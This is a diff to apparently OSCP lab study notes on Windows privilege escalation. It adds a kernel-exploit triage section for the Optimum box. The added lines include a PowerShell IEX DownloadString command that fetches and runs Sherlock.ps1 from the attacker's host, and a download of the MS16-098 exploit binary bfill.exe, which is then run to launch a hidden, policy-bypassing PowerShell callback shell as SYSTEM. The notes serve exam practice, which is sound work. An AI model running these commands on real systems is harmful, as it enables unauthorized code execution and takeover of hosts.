@@ -39,6 +39,30 @@ If `SeImpersonatePrivilege` is enabled and the first potato tool does not work, 
 
 The command should return `nt authority\\system` before moving to SYSTEM-only collection.
 
+## Old Windows kernel triage: Sherlock and processor prerequisites
+
+Run `systeminfo` before selecting a historical kernel exploit. Record the exact OS build, architecture, installed hotfixes, and processor count, then load Sherlock in the same PowerShell process:
+
+```powershell
+systeminfo
+
+IEX (New-Object Net.WebClient).DownloadString('http://$LocalIP:$TransferPort/Sherlock.ps1')
+
+Find-AllVulns
+```
+
+Sherlock reports candidates, not guaranteed execution. In particular, MS16-032 can appear vulnerable but its runtime check fails on a single-processor host. Optimum used the clean callback shell to run the reviewed MS16-098 `bfill.exe` binary instead:
+
+```powershell
+(New-Object Net.WebClient).DownloadFile('http://$LocalIP:$TransferPort/bfill.exe', 'C:\Users\$Username\Desktop\bfill.exe')
+
+C:\Users\$Username\Desktop\bfill.exe cmd.exe /c powershell.exe -NoP -NonI -W Hidden -Exec Bypass -File C:\Users\$Username\Desktop\system-shell.ps1
+
+whoami
+```
+
+Use a fresh listener for the elevated callback and run the binary from the native shell, not the original web-worker context. See [[OSCP/BOXES/WRITE UPS/Windows/Optimum|Optimum]].
+
 ## Notes
 
 Only enabled privileges are immediate candidates.
@@ -59,6 +83,7 @@ Only enabled privileges are immediate candidates.
 - [[OSCP/BOXES/WRITE UPS/Windows/Conceal|Conceal]] -- enabled SeImpersonatePrivilege confirmed through the FTP-uploaded ASP shell
 - [[OSCP/BOXES/WRITE UPS/Windows/Bastard|Bastard]] -- IUSR token triage, x64 Server 2008 R2 fingerprint, and enabled SeImpersonatePrivilege
 - [[OSCP/BOXES/WRITE UPS/Windows/Love|Love]] -- `phoebe` lacked admin membership and SeImpersonate, so both AlwaysInstallElevated policies became the escalation route
+- [[OSCP/BOXES/WRITE UPS/Windows/Optimum|Optimum]] -- one-processor `systeminfo` gotcha, Sherlock candidate review, and MS16-098 selection from a clean callback
 
 ## Related stages
 
